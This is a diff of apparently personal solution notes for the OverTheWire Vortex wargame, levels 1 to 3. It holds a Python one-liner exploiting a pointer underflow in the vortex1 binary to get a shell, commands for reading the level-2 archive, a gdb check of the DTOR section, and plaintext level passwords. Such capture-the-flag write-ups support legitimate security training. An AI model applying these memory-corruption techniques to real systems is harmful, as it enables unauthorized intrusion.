@@ -7,7 +7,7 @@ Username: vortex1 Password: Gq#qu3bF3
 
 Level 1:
 ------------------------------------------------
-- '\\' advances back the pointer
+- '\\' moves back the pointer
 
 python -c 'print "\\"*257 + "\xca" + "A"' | ./vortex1
 sh-4.1# exit
@@ -51,7 +51,19 @@ scp -v vortex2@vortex.labs.overthewire.org:'test$$' .
 Copy archive locally:
 scp vortex2@vortex.labs.overthewire.org:'/tmp/ownership.\$\$.tar' .
 
+Method 3)
+Tar command does not use compression, so the content of the archive can be viewed
+
+vortex2@melissa:/etc/vortex_pass$ cat '/tmp/ownership.$$.tar'
+
 Username: vortex3 Password: 64ncXTvx#
 
 Level 3:
 ------------------------------------------------
+$ gdb vortex3
+gdb) x/x 0x08049540
+0x8049540 <__DTOR_END__>:	0x00000000
+(gdb) quit
+
+
+Username: vortex4 Password: 
